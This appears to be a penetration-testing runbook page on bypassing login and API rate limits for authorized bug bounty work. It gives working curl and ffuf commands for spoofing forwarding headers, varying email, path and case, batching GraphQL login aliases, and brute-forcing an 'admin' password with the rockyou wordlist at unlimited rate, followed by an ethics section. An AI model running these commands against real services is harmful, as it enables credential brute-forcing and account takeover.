---
title: "Rate Limit Bypass"
description: "Circumventing throttling on logins, OTPs, and APIs using header spoofing, format tricks, and protocol-level parallelism."
phase: Web
order: 65
tags:
  - rate-limit
  - brute-force
  - authentication
  - bypass
tools:
  - ffuf
  - curl
  - burp suite
updated: 2026-10-01
---

A rate-limit bypass runbook for bug bounty / authorized pentest on **in-scope** targets only. Goal: identify how the limiter keys requests, vary that key so an attack is no longer counted, and prove it on your own account.

## 1. Identify the limiter key

```bash
for i in $(seq 1 15); do
  curl -s -o /dev/null -w "$i: %{http_code}\n" -X POST \
    "https://target.com/api/login" \
    -H "Content-Type: application/json" \
    -d '{"user":"me@test.com","pass":"wrong"}'
done
```

Note the block status and whether the limit is per IP, session, username, or endpoint.

## 2. Header spoofing

```bash
for i in $(seq 1 50); do
  curl -s -o /dev/null -w '%{http_code} ' -X POST \
    "https://target.com/api/login" \
    -H "X-Forwarded-For: 10.0.0.$i" -H "X-Real-IP: 10.0.0.$i" \
    -d 'user=me@test.com&pass=wrong'
done; echo
```

Also try chained lists, `Forwarded`, `True-Client-IP`, and `X-Client-IP`.

## 3. Parameter and format variation

```bash
for e in "user@test.com" "User@test.com" "user@test.com." \
         "user+1@test.com" "user+2@test.com"; do
  curl -s -o /dev/null -w "$e -> %{http_code}\n" -X POST \
    "https://target.com/api/login" -d "user=$e&pass=wrong"
done
```

## 4. Path and case tricks

```bash
for p in "/login" "/Login" "/LOGIN" "/login/" "/login?" "/login#"; do
  curl -s -o /dev/null -w "$p -> %{http_code}\n" -X POST \
    "https://target.com$p" -d 'user=me@test.com&pass=wrong'
done
```

## 5. Protocol-level parallelism

```bash
# GraphQL aliases bypass per-operation limits
curl -s -X POST "https://target.com/graphql" \
  -H "Content-Type: application/json" \
  -d '{"query":"mutation{a:login(u:\"admin\",p:\"1\") b:login(u:\"admin\",p:\"2\") c:login(u:\"admin\",p:\"3\")}"}'

# HTTP/2 multiplexing with connection reuse
ffuf -u "https://target.com/api/login" -X POST \
  -H "Content-Type: application/json" \
  -d '{"user":"admin","pass":"FUZZ"}' \
  -w /usr/share/wordlists/rockyou.txt -mc all -fs 0 -rate 0 -p 0.0
```

## 6. Measure the bypass

- Compare attempts allowed with and without the technique.
- Confirm the login/OTP actually validates attempts, not just that requests are sent.
- Stop as soon as the counter is clearly defeated.

## Full pipeline

```bash
TARGET="https://target.com"
for i in $(seq 1 15); do
  curl -s -o /dev/null -w "$i:%{http_code} " -X POST "$TARGET/api/login" \
    -H "Content-Type: application/json" -d '{"user":"me@test.com","pass":"wrong"}'
done; echo
for i in $(seq 1 50); do
  curl -s -o /dev/null -w '%{http_code} ' -X POST "$TARGET/api/login" \
    -H "X-Forwarded-For: 10.0.0.$i" -H "X-Real-IP: 10.0.0.$i" \
    -d 'user=me@test.com&pass=wrong'
done; echo
for e in "user@test.com" "User@test.com" "user@test.com." "user+1@test.com"; do
  curl -s -o /dev/null -w "$e -> %{http_code}\n" -X POST \
    "$TARGET/api/login" -d "user=$e&pass=wrong"
done
for p in "/login" "/Login" "/LOGIN" "/login/" "/login?"; do
  curl -s -o /dev/null -w "$p -> %{http_code}\n" -X POST \
    "$TARGET$p" -d 'user=me@test.com&pass=wrong'
done
```

## Ethics & legality

- Only brute force accounts and endpoints covered by the authorized scope.
- Use your own test accounts; never attempt real credential stuffing.
- Stop the moment the bypass is proven — do not run to completion.
- Respect any program rules about request volume and forbidden techniques.
